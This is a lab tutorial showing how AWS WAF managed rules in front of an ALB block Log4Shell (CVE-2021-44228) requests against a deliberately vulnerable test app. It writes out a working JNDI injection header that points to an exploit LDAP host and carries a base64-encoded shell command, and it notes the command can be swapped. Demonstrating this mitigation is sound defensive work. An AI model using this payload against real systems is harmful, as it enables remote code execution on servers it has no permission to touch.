# How AWS Mitigates Log4Shell(CVE-2021-44228)

![demo-scenarios-on-aws](images/demo-scenarios-on-aws.png)

## Environment Setup

Follow the [README](./README.md) to implement the HTTP Server and JNDI Exploit host for optional.

### Setup ALB for HTTP Server

1. Create a **Target Gruop** and register the EC2 Instance, which hosted vulnerable app on `8080` port.

    ![target-group-registered-targets](images/target-group-registered-targets.png)
2. Ensure the success codes set to `400` for **health check**. The health check request would not include the HTTP header, and receive the `400` error for bad reuqest.
    ![target-group-health-check](images/target-group-health-check.png)
3. Create an ALB and indicate the listener to redirect incoming traffic to the target group just created. Remind that the ALB and EC2 Instance should be in same VPC.
    ![alb-listener](images/alb-listener.png)

> The ALB listen for 80 port and redirect the traffic to the target's 8080 port base on upon settings.

### Associate WAF with ALB

1. Create a **web ACL** in AWS WAF, which need to be the same region as ALB. Here's the `Oregon (us-west-2)` for demo.
   ![waf-web-acls](images/waf-web-acls.png)
2. For the **Rules** in that web acls, apply 2 AWS Managed Rules: `AWSManagedRulesKnownBadInputsRuleSet` and `AWSManagedRulesAnonymousIpList`.
    ![waf-web-acls-rules](images/waf-web-acls-rules.png)

`AWSManagedRulesKnownBadInputsRuleSet` inspects request uri, body, and commonly used headers based on the regex.

`AWSManagedRulesAnonymousIpList` blocks the requests from services that allow the obfuscation of viewer identity. including VPN, Tor nodes, proxies, or data centers...etc..

## Mitigation / Exploitation

### Normal Behavior

The Server will return `Hello World!`, when Client sending the request properly with `X-Api-Version` header. Otherwise, the client would get the `400` HTTP error as bad request.

#### Client from local laptop

```bash
$ curl ALB_ENDPOINT
{"timestamp":"2021-12-23T08:52:38.129+00:00","status":400,"error":"Bad Request","path":"/"}%
$ curl ALB_ENDPOINT -H 'X-Api-Version: 1.1'
Hello, world!
```

![client-local-requests-normal](images/client-local-requests-normal.png)

#### Server Log

```bash
# There would be lots of this due to the health check from target group
2021-12-23 08:52:38.128  WARN 1 --- [nio-8080-exec-9] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]
# Requests with the header properly
2021-12-23 08:52:40.373  INFO 1 --- [io-8080-exec-10] HelloWorld                               : Received a request for API version 1.1
```

![server-alb-requests-normal](images/server-alb-requests-normal.png)

#### Client from EC2 Instance

Becasue the request sent out from EC2 Instance, it would receive the response with `403` HTTP error, denied by the `AWSManagedRulesAnonymousIpList` WAF rule, which blocks the obfuscated requests.

```bash
$ curl ALB_ENDPOINT
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
$ curl ALB_ENDPOINT -H 'X-Api-Version: 1.1'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
```

![client-ec2-requests-blocked](images/client-ec2-requests-blocked.png)

We can also review the requests' action are `ALLOW` or `BLOCK` by the AWS WAF Rules. As below we can see the requests from EC2 IPs were filtered by `AWSManagedRulesAnonymousIpList` WAF rule.

![waf-anonymous-rule-block](images/waf-anonymous-rule-block.png)

### Injection Attack / CVE-2021-44228

Now we gonna to send the injection request with header `'X-Api-Version: ${jndi:ldap://10.0.1.164:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'`, which would trigger the CVE-2021-44228 to execute the JNDI lookup to access with ldap, and preform the RCE.

The `dG91Y2ggL3RtcC9wd25lZAo=}` is base64 encoded from linux command line `touch /tmp/pwned`. Once the RCE achieved, it would create a file in the vulnerable app.

You can also change the behavior by replacing the base64 string with https://www.base64encode.org/.

#### Client from local laptop / EC2 Instance

The requests would be blocked if contenting know bad input by `AWSManagedRulesKnownBadInputsRuleSet` WAF rule, managed by AWS. As below, we can see it would get the `403` error if the request contenting the `jndi` lookup.

```bash
# Send the request with full injection
$ curl ALB_ENDPOINT -H 'X-Api-Version: ${jndi:ldap://JNDI_EXPLOIT_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
# Send the request with 'jndi' string
$ curl ALB_ENDPOINT -H 'X-Api-Version: ${jndi:123}'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
# Send the request with normal system infomation
$ curl ALB_ENDPOINT -H 'X-Api-Version: ${java:os}'
Hello, world!
```

![client-local-request-injection](images/client-local-request-injection.png)

If the requests were from EC2 Instance, they were blocked by `AWSManagedRulesAnonymousIpList` and `AWSManagedRulesKnownBadInputsRuleSet` WAF rules.
